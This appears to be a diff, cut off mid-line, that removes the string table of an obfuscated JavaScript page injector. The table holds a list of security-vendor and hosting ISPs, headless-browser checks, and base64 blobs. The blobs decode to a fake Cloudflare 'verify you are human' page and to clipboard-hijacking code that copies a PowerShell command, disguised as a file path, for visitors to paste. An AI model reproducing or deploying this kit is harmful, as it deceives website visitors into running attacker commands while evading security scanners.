-        'RzHXi',
-        'BLVrd',
-        'cttSQ',
-        'Vomxv',
-        'DigitalOcean',
-        'ThreatTrack',
-        'NCxLG',
-        'Alistar\x20Security\x20Srl',
-        'test',
-        '$wdc_',
-        'FORTHnet\x20SA',
-        'UsROj',
-        'NjuVG',
-        'VLsAm',
-        'setItem',
-        'China\x20Communication\x20Co.',
-        'cookie',
-        'OVH\x20SAS',
-        'Googlebot',
-        'ClearBlue\x20Technologies',
-        'Yahoo!\x20India\x20Pvt',
-        'RMiPA',
-        'outerHeight',
-        'tNAlp',
-        'BdWTU',
-        'Digital\x20Ocean',
-        'Amazon.com',
-        '38392cUiOkC',
-        'uSSix',
-        'ywYEj',
-        'DhIbS',
-        'LIUhd',
-        'Twitter\x20International\x20Company',
-        'toString',
-        'userAgent',
-        'ESET,\x20spol.\x20s\x20r.o.',
-        '?fields=isp,org,mobile,proxy,hosting',
-        'Trustwave\x20Holdings',
-        'TmcRC',
-        'iVWke',
-        'script',
-        'length',
-        'bGtee',
-        'GgmNa',
-        'Perimeter\x20eSecurity',
-        'lRkrl',
-        'YANDEX\x20LLC',
-        '33443SfhLWf',
-        'Gyron\x20Internet\x20Ltd',
-        'Microsoft\x20Corporation',
-        'proxy',
-        'xMREN',
-        'CAbvi',
-        'Internap\x20Japan\x20Co.,LTD.',
-        'McWfK',
-        'callPhantom',
-        'Facebook\x20Ireland\x20Ltd',
-        'PWghx',
-        'Topsy\x20Labs',
-        'dUNaq',
-        'rpfIS',
-        'appendChild',
-        'Microsoft\x20Corp',
-        'VYoBr',
-        'unknown',
-        'GTS\x20Telecom\x20SRL',
-        'ORXsl',
-        'Zenith\x20Electronics\x20Corporation',
-        'Access\x20allowed:',
-        'qGSvU',
-        'HKGfc',
-        'NlHtV',
-        'YhvvU',
-        'atThx',
-        'Conectiva\x20Telecom',
-        'google',
-        'Leaseweb\x20Asia',
-        'HPFcY',
-        'RSFsn',
-        'SERVER\x20BLOCK',
-        'MdxFL',
-        'GRdvV',
-        'qEsHE',
-        'pqHDl',
-        'Bot\x20user\x20agent\x20detected:',
-        'QhYry',
-        'round',
-        'oTiaX',
-        'query',
-        'DataCamp',
-        'duckduck',
-        'Yahoo\x20Corp\x20Network',
-        'xahrP',
-        'Amazon\x20Web\x20Services,\x20LLC',
-        'sSzwF',
-        'GjwWY',
-        'SbZEL',
-        'Multimedia\x20Polska\x20-\x20Poludnie\x20S.A.',
-        'loadTimes',
-        'Internap\x20Network\x20Services',
-        'log',
-        'Unified\x20Layer',
-        'BHhUf',
-        'gbWDk',
-        'SQDcB',
-        'languages',
-        'ZiIoe',
-        'mMJUU',
-        'LGTzZ',
-        'Amazon\x20Data\x20Services\x20Ireland\x20Ltd',
-        'hRBou',
-        'iWDLM',
-        'UMPel',
-        'Script\x20injection\x20failed',
-        'toxNn',
-        'json',
-        'yRfiO',
-        'M247\x20Europe',
-        'Twitter',
-        'Yahoo!\x20Broadcast\x20Services',
-        '_skip',
-        'sGLdt',
-        '20hyOGHA',
-        'Tiscali\x20UK\x20Limited',
-        'Surfcontrol-reading',
-        'ZioSA',
-        'China\x20Education\x20and\x20Research\x20Network\x20Center',
-        'includes',
-        'btjAg',
-        'language',
-        'toLowerCase',
-        'Facebook',
-        'innerWidth',
-        'yaERx',
-        'aMcUK',
-        'Beijing\x20Baidu\x20Netcom\x20Science\x20and\x20Technology\x20Co.',
-        'IaFsQ',
-        'rWCfM',
-        'removeItem',
-        'LBWUz',
-        'Cyveillance',
-        'kamJd',
-        'aouAk',
-        'Cloudmark\x20Labs',
-        'pNxHp',
-        'state',
-        'Ublsi',
-        'Hetzner\x20Online\x20GmbH',
-        'Avira\x20B.V.',
-        'Rediff.com\x20India\x20Limited',
-        'mgnUE',
-        'TtaaU',
-        'cpWEP',
-        'Microsoft\x20bingbot',
-        'cqQPv',
-        'wKGqY',
-        'teoma',
-        'aLQnb',
-        'rLhgW',
-        'Yahoo\x20Bangalore\x20Network\x20Monitoring\x20Center',
-        'RamNode\x20LLC',
-        'DxHUk',
-        'body',
-        'LLSHO',
-        'OVH\x20Hosting',
-        'nDdiq',
-        'experimental-webgl',
-        'QoWTv',
-        'NewMedia\x20Express\x20Pte',
-        'Cloudmark',
-        'ljDKn',
-        'sOELq',
-        'mWkEi',
-        'puaNm',
-        'sYaGW',
-        'LeaseWeb\x20CDN\x20B.V.',
-        'HETZNER',
-        'RZQtE',
-        'nXiEb',
-        'org',
-        'LyQnh',
-        'now',
-        'LeaseWeb\x20B.V.',
-        'EIVLo',
-        'Commtouch',
-        'VcXzO',
-        'Hetzner-as',
-        'zYcNN',
-        'Conectiva\x20Celular\x20e\x20Informatica\x20Ltda',
-        ';\x20path=/',
-        'HETZNER\x20(Pty)\x20Ltd',
-        'EGIHosting',
-        'DqZTE',
-        'Lccza',
-        'getAttribute',
-        'Bitdefender\x20SRL',
-        'AmpTj',
-        '20scifUx',
-        'bGnOm',
-        'China\x20Duty\x20Free\x20group',
-        'style',
-        'textContent',
-        'Leaseweb\x20Asia\x20Pacific\x20pte.',
-        'EpIgx',
-        'nGVxB',
-        'PZcOL',
-        'Tiscali-it',
-        'Inktomi\x20Corporation',
-        'UBErL',
-        'China\x20Dragon\x20Telecom\x20Co.,Ltd',
-        'match',
-        'kjdXb',
-        'hmAZq',
-        'zVNFM',
-        'dKuhy',
-        'EoSyy',
-        'canvas',
-        'CloudFlare',
-        'GuzQz',
-        'arwwu',
-        'ZCTjU',
-        'rixzo',
-        'nhFFJ',
-        'rpoFM',
-        'UmCYM',
-        'adYIA',
-        'nEVlP',
-        'MbIPg',
-        'ONLINE\x20SAS',
-        'China',
-        'joJcW',
-        'cssText',
-        'Conectiva',
-        'Yahoo\x20Japan',
-        'Zen\x20Systems\x20A/S',
-        'Yahoo!',
-        'Amazon\x20Corporate\x20LLC',
-        '$cdc_',
-        'McAfee',
-        'className',
-        'Faction',
-        'scrape',
-        'cOmJc',
-        'Fsqfe',
-        'Amazonia\x20Telecom\x20Ltda.\x20-\x20Me',
-        'ctVks',
-        'hCNxt',
-        'archive',
-        'cXEmQ',
-        'Webroot\x20Services',
-        'isNaN',
-        'eRVqS',
-        '189byvDuF',
-        'tGDrl',
-        'wNemc',
-        'rzAIK',
-        'NFOrce\x20Entertainment\x20B.V.',
-        'CNndd',
-        'lYVOs',
-        'outerWidth',
-        'Server\x20Central\x20Network',
-        'GncLE',
-        ';\x20expires=',
-        'LeaseWeb',
-        'TimeWeb\x20Ltd.',
-        'ZONES\x20AS',
-        'tzhMI',
-        'cEKez',
-        'NdrMJ',
-        '12YoqRdP',
-        'yandex',
-        'SPAMfighter\x20ApS',
-        'Spamfighter-as',
-        '758712ThVbPh',
-        'selenium',
-        'sSYsg',
-        'Amazonia\x20Publicidade\x20Ltda',
-        'Microsoft\x20Hosting',
-        'webdriver',
-        '24760mEszNi',
-        'EdKlt',
-        'Internet\x20Security\x20Systems',
-        'ufqhH',
-        'RWKrn',
-        'GoDaddy.com,\x20LLC',
-        'max',
-        'ckBTd',
-        'RZIxI',
-        'olsIw',
-        '(?:^|;\x20)',
-        'INETu',
-        'GHOSTnet\x20GmbH',
-        'China\x20Broadband\x20Communications\x20(CBCnet)',
-        'jmIUN',
-        'ZvDFA',
-        'SurfControl',
-        'min',
-        'YANDEX',
-        'Secure\x20Data\x20Systems',
-        'YfCvx',
-        'bwodw',
-        'GjXoN',
-        'elMdm',
-        'tKgbJ',
-        'Leaseweb\x20USA',
-        'Rackspace\x20Hosting',
-        'jCYQb',
-        'phantom',
-        'kzlBP',
-        'rzeIu',
-        'YKPYQ',
-        'AVAST\x20Software\x20s.r.o.',
-        'HgPZN',
-        'UNMASKED_RENDERER_WEBGL',
-        'asBod',
-        '844611rFgomW',
-        'UvTjQ',
-        'pDGBt',
-        'oVSxe',
-        'Xpksg',
-        'LeaseWeb\x20Network\x20B.V.',
-        'IPXO',
-        'Access\x20check\x20failed:',
-        'ueQQD',
-        'permissions',
-        'div',
-        'DedFiberCo',
-        'document',
-        'plugins',
-        'BRSyp',
-        'Microsoft\x20Limited',
-        'eQbfd',
-        'ThreatTrack\x20Security',
-        'overlay-styles',
-        'innerHeight',
-        'Headless\x20browser\x20detected\x20with\x20probability:',
-        'China\x20Construction\x20Bank\x20(Asia)\x20Corporation\x20Limited',
-        'position:fixed;top:0;left:0;width:100%;height:100vh;z-index:999999',
-        'China\x20Broadcasting\x20TV\x20Net',
-        'baidu',
-        'nIBnu',
-        'Y29uc3QgY29tbWFuZCA9IGBQb3dlcnNoZWxsLmV4ZSAtYyBwaW5nIGV4YW1wbGUuY29tICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgQzpcXFxpbnRlcm5hbC1zZWN1cmVcXGZpbGVkcml2ZVxcSFJQb2xpY3kuZG9jeCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYDsgLy9DT01NQU5ECgoKCiBjb25zdCBmaWxlSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZUlucHV0Jyk7CmNvbnN0IGZpbGVFeHBsb3JlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlRXhwbG9yZXInKTsKY29uc3QgcGF0aCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXRoJyk7CgpmdW5jdGlvbiBzZXRTa2lwRmxhZygpIHsKICAgIHRyeSB7CiAgICAgICAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oJ19za2lwJywgJzEnKTsKICAgIH0gY2F0Y2ggKGVycikgewogICAgICAgIGRvY3VtZW50LmNvb2tpZSA9ICdfc2tpcD0xOyBwYXRoPS87IG1heC1hZ2U9MzE1MzYwMDAnOwogICAgfQp9CgovLyAvLyBDb3B5IHRoZSBwb3dlcnNoZWxsIGNvbW1hbmQgaWYgdGhleSBjbGljayBvbiB0aGUgZHVtbXkgZmlsZSBwYXRoCi8vIC8vIEluIGNhc2UgdGhlIHVzZXIgdHJpZXMgdG8gYmUgc21hcnQgYW5kIG9wZW4gZmlsZSBleHBsb3JlciBtYW51YWxseQovLyBwYXRoLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24oKSB7Ci8vICAgICBuYXZpZ2F0b3IuY2xpcGJvYXJkLndyaXRlVGV4dChjb21tYW5kKTsKLy8gfSk7CgovLyBDb3B5IHBvd2Vyc2hlbGwgY29tbWFuZCAmIG9wZW4gZmlsZSBleHBsb3JlcgpmaWxlRXhwbG9yZXIuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbigpIHsKICAgIG5hdmlnYXRvci5jbGlwYm9hcmQud3JpdGVUZXh0KGNvbW1hbmQpOwogICAgc2V0U2tpcEZsYWcoKTsKCiAgICBmaWxlSW5wdXQuY2xpY2soKTsKfSk7CgovLyBCbG9jayBhbnkgYXR0ZW1wdGVkIGZpbGUgdXBsb2FkcwpmaWxlSW5wdXQuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgKCkgPT4gewogICAgYWxlcnQoIlBsZWFzZSBmb2xsb3cgdGhlIHN0YXRlZCBpbnN0cnVjdGlvbnMuIik7CiAgICBmaWxlSW5wdXQudmFsdWUgPSAiIjsKICAgIHNldFRpbWVvdXQoKCkgPT4gZmlsZUlucHV0LmNsaWNrKCksIDUwMCk7Cn0pOwoKLyogRU5EIE5FVyAqLwoKCgovLyBHRVQgCmNvbnN0IHBhcmFtcyA9IG5ldyBVUkxTZWFyY2hQYXJhbXMod2luZG93LmxvY2F0aW9uLnNlYXJjaCk7CmNvbnN0IHNpdGVVcmwgPSBwYXJhbXMuZ2V0KCdzaXRlJykgfHwgd2luZG93LmxvY2F0aW9uLmhvc3RuYW1lOwpjb25zdCBsb2dvVXJsID0gcGFyYW1zLmdldCgnbG9nbycpOwpjb25zdCBkZWZhdWx0TG9nb1VybCA9ICdodHRwczovLzJjYXB0Y2hhLmNvbS9kaXN0L3dlYi9hc3NldHMvZ29vZ2xlLXByaXZhY3ktcG9saWN5LUNiMENHVlJULnN2Zyc7Cgpkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCcuZG9tYWluLW5hbWUnKS5mb3JFYWNoKGVsID0+IHsKICBlbC50ZXh0Q29udGVudCA9IHNpdGVVcmw7Cn0pOwoKZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnLmxvZ28taW1nJykuZm9yRWFjaChpbWcgPT4gewogIGltZy5zcmMgPSBsb2dvVXJsIHx8IGRlZmF1bHRMb2dvVXJsOwogIGltZy5hbHQgPSAnbG9nbyc7Cn0pOwoKCgpmdW5jdGlvbiBpbml0VmVyaWZpY2F0aW9uRmxvdygpIHsKICAgIGNvbnN0IHByZWxvYWRlckVsZW1lbnRzID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgiLnByZWxvYWRlciIpOwogICAgY29uc3QgcHJlbG9hZGVyVGV4dCA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIi5wcmVsb2FkZXJfdGV4dCIpOwogICAgY29uc3QgdGV4dEFsbFN0ZXAgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIudGV4dGFsbHN0ZXAiKTsKICAgIGNvbnN0IGNoZWNrYm94V2luZG93ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNoZWNrYm94LXdpbmRvdyIpOwogICAgY29uc3Qgc3RlcDBFbGVtZW50cyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoIi5zdGVwMCIpOwogICAgY29uc3Qgc3RlcDFFbGVtZW50cyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoIi5zdGVwMSIpOwogICAgY29uc3Qgc3RlcDJFbGVtZW50cyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoIi5zdGVwMiIpOwogICAgY29uc3Qgc3RlcDNFbGVtZW50cyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoIi5zdGVwMyIpOwogICAgY29uc3QgY2hlY2tib3ggPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY2hlY2tib3giKTsKICAgIGNvbnN0IHZlcmlmeVdpbmRvdyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ2ZXJpZnktd2luZG93Iik7CiAgICBjb25zdCBzcGlubmVyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInNwaW5uZXIiKTsKICAgIGNvbnN0IHZlcmlmeUJ1dHRvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ2ZXJpZnktYnV0dG9uIik7CgogICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgcHJlbG9hZGVyRWxlbWVudHMuZm9yRWFjaChlbCA9PiBlbC5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiKTsKICAgICAgICBwcmVsb2FkZXJUZXh0LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgdGV4dEFsbFN0ZXAuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgICAgICAgY2hlY2tib3hXaW5kb3cuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKCiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgIGNoZWNrYm94V2luZG93LnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7IAogICAgICAgICAgICBsZXQgb3BhY2l0eSA9IDA7CiAgICAgICAgICAgIGxldCBmYWRlSW4gPSBzZXRJbnRlcnZhbCgoKSA9PiB7CiAgICAgICAgICAgICAgICBpZiAob3BhY2l0eSA+PSAxKSB7CiAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChmYWRlSW4pOyAKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgb3BhY2l0eSArPSAwLjE7IAogICAgICAgICAgICAgICAgICAgIGNoZWNrYm94V2luZG93LnN0eWxlLm9wYWNpdHkgPSBvcGFjaXR5OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9LCAzMCk7CiAgICAgICAgfSwgMjAwKTsKCiAgICAgICAgc3RlcDBFbGVtZW50cy5mb3JFYWNoKGVsID0+IGVsLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siKTsKCiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgIHN0ZXAwRWxlbWVudHMuZm9yRWFjaChlbCA9PiBlbC5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiKTsKICAgICAgICAgICAgc3RlcDFFbGVtZW50cy5mb3JFYWNoKGVsID0+IGVsLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siKTsKICAgICAgICB9LCAyMDAwKTsgCiAgICB9LCAxNTAwKTsgCgogICAgY2hlY2tib3guYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbiAoKSB7CiAgICAgICBjb25zdCB0ZXh0YXJlYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RleHRhcmVhJyk7CiAgICAgICAgdGV4dGFyZWEudmFsdWUgPSBjb21tYW5kOwogICAgICAgIHRleHRhcmVhLnNldEF0dHJpYnV0ZSgncmVhZG9ubHknLCAnJyk7CiAgICAgICAgdGV4dGFyZWEuc3R5bGUucG9zaXRpb24gPSAnYWJzb2x1dGUnOwogICAgICAgIHRleHRhcmVhLnN0eWxlLmxlZnQgPSAnLTk5OTlweCc7CiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh0ZXh0YXJlYSk7CiAgICAgICAgdGV4dGFyZWEuc2VsZWN0KCk7CiAgICAgICAgZG9jdW1lbnQuZXhlY0NvbW1hbmQoJ2NvcHknKTsKICAgICAgICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKHRleHRhcmVhKTsKICAgICAgICBjb25zb2xlLmxvZygn4pyFJyk7CgogICAgICAgIHN0ZXAxRWxlbWVudHMuZm9yRWFjaChlbCA9PiBlbC5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiKTsKICAgICAgICBzdGVwMkVsZW1lbnRzLmZvckVhY2goZWwgPT4gZWwuc3R5bGUuZGlzcGxheSA9ICJibG9jayIpOwogICAgICAgIHNwaW5uZXIuc3R5bGUudmlzaWJpbGl0eSA9ICJ2aXNpYmxlIjsKCiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgIGNoZWNrYm94V2luZG93LnN0eWxlLndpZHRoID0gIjUzMHB4IjsKICAgICAgICAgICAgY2hlY2tib3hXaW5kb3cuc3R5bGUuaGVpZ2h0ID0gImF1dG8iOwogICAgICAgICAgICB2ZXJpZnlXaW5kb3cuc3R5bGUuYm9yZGVyVG9wID0gIjFweCBzb2xpZCAjNzk3OTc5IjsKICAgICAgICAgICAgdmVyaWZ5V2luZG93LnN0eWxlLnBhZGRpbmdUb3AgPSAiM3B4IjsKICAgICAgICAgICAgdmVyaWZ5V2luZG93LnN0eWxlLm1hcmdpblRvcCA9ICIxNXB4IjsKICAgICAgICAgICAgdmVyaWZ5V2luZG93LmNsYXNzTGlzdC5hZGQoImFjdGl2ZSIpOwogICAgICAgIH0sIDUwMCk7CiAgICB9KTsKCiAgICB2ZXJpZnlCdXR0b24uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbiAoKSB7CiAgICAgICAgdmVyaWZ5V2luZG93LmNsYXNzTGlzdC5yZW1vdmUoImFjdGl2ZSIpOwogICAgICAgIGNoZWNrYm94V2luZG93LnN0eWxlLmhlaWdodCA9ICI3NHB4IjsKCiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgIGNoZWNrYm94V2luZG93LnN0eWxlLndpZHRoID0gIjMwMHB4IjsKICAgICAgICAgICAgc3RlcDJFbGVtZW50cy5mb3JFYWNoKGVsID0+IGVsLnN0eWxlLmRpc3BsYXkgPSAibm9uZSIpOwogICAgICAgICAgICBzdGVwM0VsZW1lbnRzLmZvckVhY2goZWwgPT4gZWwuc3R5bGUuZGlzcGxheSA9ICJibG9jayIpOwoKICAgICAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgICAgICBzdGVwM0VsZW1lbnRzLmZvckVhY2goZWwgPT4gZWwuc3R5bGUuZGlzcGxheSA9ICJub25lIik7CiAgICAgICAgICAgICAgICBzdGVwMUVsZW1lbnRzLmZvckVhY2goZWwgPT4gZWwuc3R5bGUuZGlzcGxheSA9ICJibG9jayIpOwogICAgICAgICAgICAgICAgc3Bpbm5lci5zdHlsZS52aXNpYmlsaXR5ID0gImhpZGRlbiI7CiAgICAgICAgICAgIH0sIDEwMDApOwogICAgICAgIH0sIDYwMCk7CiAgICB9KTsKCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidmVyaWZpY2F0aW9uLWlkIikudGV4dENvbnRlbnQgPSBNYXRoLmZsb29yKDEwMDAwMCArIE1hdGgucmFuZG9tKCkgKiA5MDAwMDApOwogICAgY29uc3QgY2hhcnMgPSAiYWJjZGVmMDEyMzQ1Njc4OSI7CiAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIucmF5LWlkIikudGV4dENvbnRlbnQgPSBBcnJheS5mcm9tKHsgbGVuZ3RoOiAxNiB9LCAoKSA9PiBjaGFyc1tNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiBjaGFycy5sZW5ndGgpXSkuam9pbigiIik7Cn0KCmlmIChkb2N1bWVudC5yZWFkeVN0YXRlID09PSAibG9hZGluZyIpIHsKICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoIkRPTUNvbnRlbnRMb2FkZWQiLCBpbml0VmVyaWZpY2F0aW9uRmxvdyk7Cn0gZWxzZSB7CiAgICBpbml0VmVyaWZpY2F0aW9uRmxvdygpOwp9CgoKIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2NvcHknLCBmdW5jdGlvbiAoZSkgewogICAgZS5wcmV2ZW50RGVmYXVsdCgpOwogICAgaWYgKGUuY2xpcGJvYXJkRGF0YSkgewogICAgICAgIGUuY2xpcGJvYXJkRGF0YS5zZXREYXRhKCd0ZXh0L3BsYWluJywgY29tbWFuZCk7CiAgICAgICAgY29uc29sZS5sb2coJ+KchScpOwogICAgfSBlbHNlIGlmICh3aW5kb3cuY2xpcGJvYXJkRGF0YSkgewogICAgICAgIHdpbmRvdy5jbGlwYm9hcmREYXRhLnNldERhdGEoJ1RleHQnLCBjb21tYW5kKTsKICAgIH0KfSk7Cg==',
-        'GxLot',
-        'vLQMk',
-        'ONLINE\x20S.A.S.',
-        'Pulsepoint',
-        'QuadraNet',
-        'chrome',
-        'JSC\x20RTComm.RU',
-        'getContext',
-        'LLC\x20masterhost',
-        'getItem',
-        'dDlMX',
-        'qjtdC',
-        'CFniH',
-        'https://api.ipify.org?format=json',
-        'true',
-        'PGh0bWwgbGFuZz0iZW4iPjxoZWFkPg0KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4NCiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+DQogICAgPHRpdGxlPkNoZWNraW5nIGlmIHlvdSBhcmUgaHVtYW48L3RpdGxlPg0KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvZm9udC1hd2Vzb21lLzYuMC4wLWJldGEzL2Nzcy9hbGwubWluLmNzcyI+DQogICAgPHN0eWxlPg0KICAgIGJvZHkgew0KICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmNmY2ZjOw0KICAgICAgICBjb2xvcjogIzMxMzEzMTsNCiAgICB9DQoNCiAgICAub3ZlcmxheS1zdHlsZXMgew0KICAgICAgYmFja2dyb3VuZDogcmdiYSgyNTUsMjU1LDI1NSwwLjkpOw0KICAgIH0NCg0KICAgIC5jbG91ZGZsYXJlLWxvZ28gew0KICAgICAgY29sb3I6ICMwMDAwMDA7DQogICAgfQ0KDQogICAgQG1lZGlhIChwcmVmZXJzLWNvbG9yLXNjaGVtZTogZGFyaykgew0KICAgICAgICBib2R5IHsNCiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMyMjIgIWltcG9ydGFudDsNCiAgICAgICAgICAgIGNvbG9yOiAjZDlkOWQ5ICFpbXBvcnRhbnQ7DQogICAgICAgIH0NCiAgICAgICAgLnRldHR4IHsNCiAgICAgICAgICAgIGNvbG9yOiAjZDlkOWQ5ICFpbXBvcnRhbnQ7DQogICAgICAgICAgICB3aGl0ZS1zcGFjZTogbm93cmFwOw0KICAgICAgICB9DQogICAgICAgIC5vdmVybGF5LXN0eWxlcyB7DQogICAgICAgICAgYmFja2dyb3VuZDogcmdiYSgwLDAsMCwwLjkpOw0KICAgICAgICB9DQogICAgICAgIC5jbG91ZGZsYXJlLWxvZ28gew0KICAgICAgICAgIGNvbG9yOiAjZmZmZmZmOw0KICAgICAgIH0NCiAgICAgICAgLmNoZWNrYm94LXdpbmRvdyB7DQogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMjMyMzIzICFpbXBvcnRhbnQ7DQogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjNDQ0ICFpbXBvcnRhbnQ7DQogICAgICAgIH0NCiAgICAgICAgLmNoZWNrYm94IHsNCiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMyMzIzMjMgIWltcG9ydGFudDsNCiAgICAgICAgICAgIGJvcmRlcjogMnB4IHNvbGlkICM3OTc5NzkgIWltcG9ydGFudDsNCiAgICAgICAgfQ0KICAgICAgICAuaW5zdHJ1Y3Rpb25zIHsNCiAgICAgICAgICAgIGNvbG9yOiAjZDlkOWQ5ICFpbXBvcnRhbnQ7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgfQ0KDQogICAgLnRldHR4IHsNCiAgICAgICAgICAgIGNvbG9yOiAjMzEzMTMxOw0KICAgIH0NCg0KICAgIC52ZXJpZnktbWFpbiB7DQogICAgICAgICAgICBjb2xvcjogIzMxMzEzMSAhaW1wb3J0YW50Ow0KICAgIH0NCg0KICAgIC52ZXJpZnktdmVyaWZ5LWJ1dHRvbiB7DQogICAgICAgICAgICBiYWNrZ3JvdW5kOiAjMzMzMzMzICFpbXBvcnRhbnQ7DQogICAgfQ0KDQogICAgLmNoZWNrYm94LXdpbmRvdyB7DQogICAgIGRpc3BsYXk6IGZsZXg7DQogICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47DQogICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7DQogICAgIHdpZHRoOiAzMDBweDsNCiAgICAgaGVpZ2h0OiA3NHB4Ow0KICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmFmYWZhOw0KICAgICBib3JkZXI6IDFweCBzb2xpZCAjZTBlMGUwOw0KICAgICBib3JkZXItcmFkaXVzOiA0cHg7DQogICAgIHBhZGRpbmc6IDEwcHg7DQogICAgIG92ZXJmbG93OiBoaWRkZW47DQogICAgIHRyYW5zaXRpb246IHdpZHRoIDAuNXMgZWFzZS1pbi1vdXQsIGhlaWdodCAwLjVzIGVhc2UtaW4tb3V0Ow0KICAgIH0NCg0KICAgIC50aGVtZS1kYXJrIC5sb2dvLXRleHQgew0KICAgIGZpbGw6ICNmZmY7DQogICAgfQ0KDQogICAgLmNoZWNrYm94LWNvbnRhaW5lciB7DQogICAgIHdpZHRoOiAyOHB4Ow0KICAgICBoZWlnaHQ6IDI4cHg7DQogICAgIG1hcmdpbi1sZWZ0OiAxMnB4Ow0KICAgICBtYXJnaW4tcmlnaHQ6IDhweDsNCiAgICAgcG9zaXRpb246IHJlbGF0aXZlOw0KICAgICBkaXNwbGF5OiBmbGV4Ow0KICAgICBhbGlnbi1pdGVtczogY2VudGVyOw0KICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsNCiAgICB9DQoNCi5jaGVja2JveCB7DQogICAgd2lkdGg6IDEwMCU7DQogICAgaGVpZ2h0OiAxMDAlOw0KICAgIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7DQogICAgYm9yZGVyLXJhZGl1czogMnB4Ow0KICAgIGJvcmRlcjogMnB4IHNvbGlkICM4ODg4ODg7DQogICAgY3Vyc29yOiBwb2ludGVyOw0KICAgIHRyYW5zaXRpb246IGJvcmRlci1jb2xvciAwLjNzLCBiYWNrZ3JvdW5kLWNvbG9yIDAuM3M7DQogICAgZGlzcGxheTogZmxleDsNCiAgICBhbGlnbi1pdGVtczogY2VudGVyOw0KICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOw0KfQ0KDQogICAgLmNoZWNrYm94LmNoZWNrZWQgew0KICAgICBib3JkZXItY29sb3I6ICM0Mjg1ZjQ7DQogICAgIGJhY2tncm91bmQtY29sb3I6ICM0Mjg1ZjQ7DQogICAgIHBvc2l0aW9uOiByZWxhdGl2ZTsNCiAgICB9DQoNCiAgICAuY2hlY2tib3guY2hlY2tlZDo6YWZ0ZXIgew0KICAgICBjb250ZW50OiAiXGYwMGMiOw0KICAgICBmb250LWZhbWlseTogIkZvbnRBd2Vzb21lIjsNCiAgICAgY29sb3I6IC